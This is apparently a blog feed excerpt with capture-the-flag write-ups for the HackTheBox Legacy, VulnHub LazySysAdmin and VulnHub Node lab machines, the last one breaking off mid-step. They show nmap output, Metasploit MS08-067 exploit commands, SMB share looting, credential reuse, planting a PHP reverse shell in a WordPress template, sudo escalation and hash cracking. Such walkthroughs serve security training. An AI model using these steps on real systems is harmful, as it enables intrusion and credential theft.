<pre><code># Nmap 7.70 scan initiated Fri Nov  1 14:44:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/xml/_quick_tcp_nmap.xml 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.057s latency).
Scanned at 2019-11-01 14:44:28 PDT for 276s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT     STATE  SERVICE       REASON          VERSION
139/tcp  open   netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  syn-ack ttl 127 Windows XP microsoft-ds
3389/tcp closed ms-wbt-server reset ttl 127
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h59m53s, deviation: 1h24m50s, median: -4h59m53s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:0c:03 (VMware)
| Names:
|   LEGACY&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   HTB&lt;00&gt;              Flags: &lt;group&gt;&lt;active&gt;
|   LEGACY&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   HTB&lt;1e&gt;              Flags: &lt;group&gt;&lt;active&gt;
|   HTB&lt;1d&gt;              Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
| Statistics:
|   00 50 56 b9 0c 03 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Timeout)
|   Check 2 (port 13850/tcp): CLEAN (Timeout)
|   Check 3 (port 50902/udp): CLEAN (Timeout)
|   Check 4 (port 54226/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-11-01T20:44:53+02:00
| smb-security-mode:
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 14:49:04 2019 -- 1 IP address (1 host up) scanned in 276.38 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_legacy/openports.png.webp" />  </p>
<p>3. From the Nmap scan results, we find that the target system has SMB service running and is a Windows XP system:  </p>
<pre><code>| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-11-01T20:44:53+02:00
</code></pre>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>137/udp  |  netbios-ns    |  Microsoft Windows netbios-ns (workgroup: HTB)
139/tcp  |  netbios-ssn   |  Microsoft Windows netbios-ssn
445/tcp  |  microsoft-ds  |  Windows XP microsoft-ds
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. For a Microsoft Windows XP system with open SMB, we use the MSF <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067">MS08-067</a> exploit <code>windows/smb/ms08_067_netapi</code> and gain a shell with elevated privileges on the target system:  </p>
<pre><code>msfconsole
  use exploit/windows/smb/ms08_067_netapi
  set RHOST 10.10.10.4
  set LHOST 10.10.14.18
  show options
  exploit
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_legacy/screenshot01.png.webp" />  </p>
<p>2. We then obtain further information about the system and read the contents of both <code>user.txt</code> and <code>root.txt</code> files to comeplete the challenge:  </p>
<pre><code>ipconfig
systeminfo
dir user.txt /s /p
type &quot;C:\Documents and Settings\john\Desktop\user.txt&quot;
type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_legacy/screenshot02.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_legacy/screenshot03.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_legacy/screenshot04.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>ntauth/system@LEGACY&gt; id
NT AUTHORITY\SYSTEM
ntauth/system@LEGACY&gt;  
ntauth/system@LEGACY&gt; uname
Host Name:                 LEGACY
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Uniprocessor Free
ntauth/system@LEGACY&gt;  
ntauth/system@LEGACY&gt; ifconfig
Ethernet adapter Local Area Connection:
  Connection-specific DNS Suffix  . :
  IP Address. . . . . . . . . . . . : 10.10.10.4
  Subnet Mask . . . . . . . . . . . : 255.255.255.0
  Default Gateway . . . . . . . . . : 10.10.10.2
ntauth/system@LEGACY&gt;  
ntauth/system@LEGACY&gt; users
Administrator
john
</code></pre>
<h2>Loot</h2>
<h3>Flags</h3>
<pre><code>C:\Documents and Settings\john\Desktop\user.txt: e69af0e4f443de7e................
C:\Documents and Settings\Administrator\Desktop\root.txt: 993442d258b0e0..................
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/2">https://www.hackthebox.eu/home/machines/profile/2</a>  </li>
<li><a href="https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02">https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[VulnHub] LazySysAdmin: 1</title>
      <link>https://7h3ram.github.io/posts/20191029_vulnhub-lazysysadmin1.html</link>
      <guid>https://7h3ram.github.io/posts/20191029_vulnhub-lazysysadmin1.html</guid>
      <pubDate>Tue, 29 Oct 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">LazySysAdmin: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_lazysysadmin1/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_lazysysadmin1/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>22/tcp/ssh/OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</code>: <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a><br />
2. <code>80/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_app_wordpress">enumerate_app_wordpress</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#exploit_wordpress_template">exploit_wordpress_template</a><br />
3. <code>139/tcp/netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_nullsession">exploit_smb_nullsession</a>, <a href="https://github.com/7h3rAm/writeups#exploit_smb_web_root">exploit_smb_web_root</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Tue Oct 29 11:18:00 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lazysysadmin1/results/192.168.92.191/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lazysysadmin1/results/192.168.92.191/scans/xml/_quick_tcp_nmap.xml 192.168.92.191
Nmap scan report for 192.168.92.191
Host is up, received arp-response (0.019s latency).
Scanned at 2019-10-29 11:18:03 PDT for 27s
Not shown: 994 closed ports
Reason: 994 resets
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKXQVTTRKsDhYwPWdmZ2BDTjKcCtJ7SnW0BHwbBvIdUVOh7zjZ6xjkEJ4TkT/Y+lJUolKMMNDu+CNPrRNKyBfjQ5w13mO7/3mKh9p52bzHG6XFS2m7GI4cLiDbmjO9L/YhU5deFP1Bo02KxzREp/ipz/CVlRr8IZm/x7SbPXtzv1AAAAFQDorLYH3AOwt18+kzAxGO0f2SarWQAAAIEAmOm6aWDLi+a85rfIm2Llb24aPZN3OsntJKVk4iCDbKxXi7xd6K9h1t+Utrg7dn4oO/QrVv8RRYBSiuJ8sy7B2+YDM0X7v+yqIG8FdA66tFpnMiMvdhYXoLyiod71vTqmGuAVKyHc56fUtdb3gCMjO0CHhPTKg2S0gPfFOqiyGVUAAACACvwr3X/J810mevpUQokt4xBBPNiIGkbK9KbZG63vi1NvGmaOkzbo3Cf8gZ0ILFd3YlryhP6c8PHaQMWcvzMT9oTyJ4FOokv1D3Mh4APPZ1SDqCmryHmRazggnbYlbGkYiqmZHUvS1zNalJHfC/QIHQZAjeUrHl8ZVHKk5ZYktAE=
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL4kUdp6Gej0kmVuGrpPSUUIqYmMsiqjbZ4PFCmji+ozLhgBlWE4+XcghV9PWTUmBdU6yZsylputJMi87GBW8s66tCnZU2lm+APerAT+euYlUgi+xoigD+g2VWthVNwvj2mg8updYtcZ3Jv2besdsohtadike0fwJAPfvl/ss9jE9AFv73DHu2EuwrP/3tM0WG7GgQQj01TFmrLYnDX9unvKcOi3kLgQ9I6JfdSC1oc+lBtkOp12hr5gIlYIlAgI+E2yl79cdk6PTQ4mgRmIEJguLbWo8mnaEI77y1Lz7xpxi89/gWjQuS+DMPbbpoJZdRkTldTr0QaJuP2i0ys8Dh
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBcmYC//tB7vdI00Q3Czjvzi7cao1q+PtbUHYxSk7ay3rM1LStjxRkpUZPQWpVRdU9kWJhIiYZDMPf8gOSgC2eY=
|   256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKQXcDdFdhnLjXj6zgOcox1r7UBkTYpaOYdioJt97xdA
80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       syn-ack ttl 64 MySQL (unauthorized)
6667/tcp open  irc         syn-ack ttl 64 InspIRCd
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.92.190
|_  error: Closing link: (nmap@192.168.92.190) [Client exited]
MAC Address: 00:0C:29:C2:70:16 (VMware)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h19m58s, deviation: 5h46m22s, median: 0s
| nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   LAZYSYSADMIN&lt;00&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   LAZYSYSADMIN&lt;03&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   LAZYSYSADMIN&lt;20&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59130/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 20872/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25346/udp): CLEAN (Failed to receive data)
|   Check 4 (port 16469/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2019-10-30T04:18:22+10:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-29 11:18:22
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 29 11:18:30 2019 -- 1 IP address (1 host up) scanned in 30.69 seconds
</code></pre>
<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_lazysysadmin1/openports.png.webp" />  </p>
<p>3. Upon visiting the <code>80/tcp</code>, we find an unknown web application. Inspecting further, we find a few links via <code>robots.txt</code> file but none of those seem useful.  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot02.png.webp" />  </p>
<p>4. We also find a <code>wordpress</code> directory from the <code>gobuster</code> scan report. Initial attempts to login via common default credentials didn't succeed. Since we already have read access to Wordpress installation via the open SMB share, we download the <code>wp-config.php</code> file and obtain the hardcoded MySQL credentials within it:  </p>
<pre><code>gobuster -u http://192.168.92.191:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
smbclient //192.168.92.191/share$
  cd wordpress
  get wp-config.php
</code></pre>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot07.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot08.png.webp" />  </p>
<p>5. We explore the SMB service and find that there is a user named <code>togie</code> on this system. Other than that, there is an open (readonly) SMB share and it is also the web root. We find a lot of interesting files within this directory, particularly the <code>deets.txt</code> file that has a password <code>12345</code>, possibly for user <code>togie</code>:  </p>
<pre><code>enum4linux -a -M -l -d 192.168.92.191
smbclient //192.168.92.191/share$
http://192.168.92.191/deets.txt
</code></pre>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot03.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.5.2" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot03a.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.5.3" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot04.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>22/tcp    |  ssh          |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp    |  http         |  Apache httpd 2.4.7 ((Ubuntu))
137/udp   |  netbios-ns   |  Samba nmbd netbios-ns (workgroup: WORKGROUP)
139/tcp   |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   |  netbios-ssn  |  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp  |  mysql        |  MySQL (unauthorized)
6667/tcp  |  irc          |  InspIRCd
</code></pre>
<h4>Files</h4>
<pre><code>http://192.168.92.191/robots.txt
http://192.168.92.191/deets.txt
http://192.168.92.191/wordpress
</code></pre>
<h4>Users</h4>
<pre><code>ssh: togie
wordpress: admin, togie
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We now ssh as user <code>togie</code> with the password <code>12345</code> obtained from <code>deets.txt</code> file and it works:  </p>
<pre><code>ssh togie@192.168.92.191
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot04a.png.webp" />  </p>
<p>2. On the other hand, we successfully used credentials obtained from <code>wp-config.php</code> file to login to Wordpress since the administrator has reused those credentials:  </p>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot09.png.webp" />  </p>
<p>3. To get interactive access, we edit the <code>404.php</code> template page and add a PHP reverse shell to it. We then start a local <code>netcat</code> listener and visit a non-existing page to trigger the webshell:  </p>
<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot10.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot12.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>www-data@LazySysAdmin&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@LazySysAdmin&gt;  
www-data@LazySysAdmin&gt; uname
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
www-data@LazySysAdmin&gt;  
www-data@LazySysAdmin&gt; ifconfig
eth0  Link encap:Ethernet  HWaddr 00:0c:29:c2:70:16
      inet addr:192.168.92.191  Bcast:192.168.92.255  Mask:255.255.255.0
      inet6 addr: fe80::20c:29ff:fec2:7016/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:445407 errors:58 dropped:159 overruns:0 frame:0
      TX packets:368829 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:52069828 (52.0 MB)  TX bytes:80329306 (80.3 MB)
      Interrupt:19 Base address:0x2000
www-data@LazySysAdmin&gt;  
www-data@LazySysAdmin&gt; users
root
togie
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We find that the user <code>togie</code> can execute any commands as user <code>root</code>. We use this misconfiguration to elevate privileges:  </p>
<pre><code>sudo -l
sudo bash
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot15.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot16.png.webp" />  </p>
<p>2. We then view the contents of the <code>/root/proof.txt</code> file to complete the challenge:  </p>
<pre><code>cat /root/proof.txt
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_lazysysadmin1/screenshot17.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$6$O4bZf1Ju$0xcLPNyQkVcKT0CajZYBOTz4thlujMRjQ7XuFstUDWwYHKmVmJsDmzGXUwYbU1uqr6jxEvX4XJjSUgiwj........................
togie:$6$dvOTOc6x$jpt1MVPeBsVlfkhVXl3sv21x2Ls2qle8ouv/JMdR6yNpt2nHHahrh0cyT.8PfVcNqlrAHYFkK2WYdSbxQ........................
</code></pre>
<h3>Credentials</h3>
<pre><code>ssh: togie/12...
mysql: Admin/TogieMYSQL12.....
wordpress: admin/TogieMYSQL12.....
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">https://www.vulnhub.com/entry/lazysysadmin-1,205/</a>  </li>
<li><a href="https://www.gerrenmurphy.com/vulnhub-lazysysadmin-walkthrough/">https://www.gerrenmurphy.com/vulnhub-lazysysadmin-walkthrough/</a>  </li>
<li><a href="https://neilsec.com/ctf/vulnhub-lazysysadmin-1-ctf-attempt/">https://neilsec.com/ctf/vulnhub-lazysysadmin-1-ctf-attempt/</a>  </li>
</ul>]]></description>
      <category>vulnhub</category><category>writeup</category>    </item>
        <item>
      <title>[VulnHub] Node: 1</title>
      <link>https://7h3ram.github.io/posts/20191028_vulnhub-node1.html</link>
      <guid>https://7h3ram.github.io/posts/20191028_vulnhub-node1.html</guid>
      <pubDate>Mon, 28 Oct 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/node-1,252/#">Node: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_node1/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_node1/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>3000/tcp/http/Node.js Express framework</code>: <a href="https://github.com/7h3rAm/writeups#exploit_nodejs">exploit_nodejs</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#exploit_mongodb">exploit_mongodb</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Tue Oct 22 14:20:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.node1/results/192.168.92.189/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.node1/results/192.168.92.189/scans/xml/_quick_tcp_nmap.xml 192.168.92.189
Nmap scan report for 192.168.92.189
Host is up, received arp-response (0.00084s latency).
Scanned at 2019-10-22 14:20:28 PDT for 21s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
MAC Address: 00:0C:29:FE:C0:B6 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 22 14:20:49 2019 -- 1 IP address (1 host up) scanned in 23.99 seconds
</code></pre>
<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_node1/openports.png.webp" />  </p>
<p>3. We explore the <code>3000/tcp</code> service and find a Node.js webapp. Upon exploring the source we come across few REST API calls of which the <code>http://192.168.92.189:3000/api/users/</code> call is very important as it lists regsitered usernames and password hashes. We use online tools to detect hash type as SHA256 and find plaintext strings for three users:  </p>
<pre><code>username: myP14ceAdm1nAcc0uNT
hash: dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
plaintext: manchester

username: tom
hash: f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
plaintext: spongebob

username: mark
hash: de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
plaintext: snowflake
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_node1/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_node1/screenshot02.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.3" src="/static/files/posts_vulnhub_node1/screenshot03.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>22/tcp    |  ssh   |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
3000/tcp  |  http  |  Node.js Express framework
</code></pre>
<h4>Files</h4>
<pre><code>http://192.168.92.189:3000/assets/js/app/controllers/home.js
http://192.168.92.189:3000/api/users/latest
http://192.168.92.189:3000/api/users/
</code></pre>
<h4>Users</h4>
<pre><code>ssh: mark
webapp: tom, mark, rastating
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We authenticate as user <code>myP14ceAdm1nAcc0uNT</code> as from the username it seems to be an administrative account. Upon successful login, we get a page to download backup. We proceed and get a plaintext file named <code>myplace.backup</code>. This file has text that looks to be Base64 encoded. Once decoded, we get a zip archive which is password encrypted. We bruteforce the password for the archive and sucessfully extract its contents:  </p>
<pre><code>file myplace.backup
b64d $(cat myplace.backup) &gt;unknown
frackzip -uDP /usr/share/wordlists/rockyou.txt unknown
unzip -o -P &quot;magicword&quot; unknown
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_node1/screenshot04.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_node1/screenshot06.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_node1/screenshot07.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_vulnhub_node1/screenshot08.png.webp" />  </p>
<p>2. Within the extracted the zip archive we get a backup of the <code>/var</code> directory on the target system. This directory has source for the Node.js web application running on <code>3000/tcp</code>. Within the source, we find hardcoded MongoDB credentials for user <code>mark</code>. We try those credentials to login via SSH and get local access:  </p>
<pre><code>head var/www/myplace/app.js
